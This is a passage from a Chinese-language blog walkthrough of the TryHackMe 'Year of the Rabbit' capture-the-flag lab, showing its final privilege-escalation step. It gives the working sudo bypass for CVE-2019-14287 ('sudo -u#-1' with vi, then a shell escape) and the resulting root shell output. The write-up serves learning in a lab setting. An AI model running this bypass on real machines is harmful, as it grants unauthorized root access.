+User gwendoline may run the following commands on year-of-the-rabbit:
+    (ALL, !root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;vi &#x2F;home&#x2F;gwendoline&#x2F;user.txt
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>但是我们需要的就是 <code>root</code> 身份，谷歌搜索找到 <code>sudo</code> 绕过技巧 <code>CVE-2019-14287</code></p>
+<p><code>sudo -u#-1</code> 允许用户以 <code>root</code> 身份执行命令，即使规则中写了 <code>!root</code></p>
+<p>在进入 <code>vi</code> 界面后，在命令模式输入 <code>:!/bin/bash</code> 即可提权</p>
+<pre class="line-numbers language-none"><code class="language-none">gwendoline@year-of-the-rabbit:~$ sudo -u#-1 &#x2F;usr&#x2F;bin&#x2F;vi &#x2F;home&#x2F;gwendoline&#x2F;user.txt
+
+root@year-of-the-rabbit:&#x2F;home&#x2F;gwendoline# id
+uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io">X9wd09ncc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io/post/TryHackMe_Year_of_the_Rabbit.html">https://x9wd09ncc.github.io/post/TryHackMe_Year_of_the_Rabbit.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://x9wd09ncc.github.io" target="_blank">X9wd09ncc</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/thm/">thm</a><a class="post-meta__tags" href="/tags/easy/">easy</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a><a class="post-meta__tags" href="/tags/cve-2019-14287/">CVE-2019-14287</a></div><div class="post_share"><div class="social-share" data-image="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/post/TryHackMe_Brute_It.html" title="TryHackMe_Brute It"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TryHackMe_Brute It</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/TryHackMe-CyberHeroes.html" title="TryHackMe_CyberHeroes"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_CyberHeroes</div></div></a></div><div><a href="/post/TruHackMe_Valley.html" title="TryHackMe_Valley"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Valley</div></div></a></div><div><a href="/post/TryHackMe_Anthem.html" title="TryHackMe_Anthem"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Anthem</div></div></a></div><div><a href="/post/TryHackMe_Archangel.html" title="TryHackMe_tomghost"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-15</div><div class="title">TryHackMe_tomghost</div></div></a></div><div><a href="/post/TryHackMe_Blueprint.html" title="TryHackMe_Buleprint"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-12</div><div class="title">TryHackMe_Buleprint</div></div></a></div><div><a href="/post/TryHackMe_Brute_It.html" title="TryHackMe_Brute It"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-17</div><div class="title">TryHackMe_Brute It</div></div></a></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2026 By X9wd09ncc</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
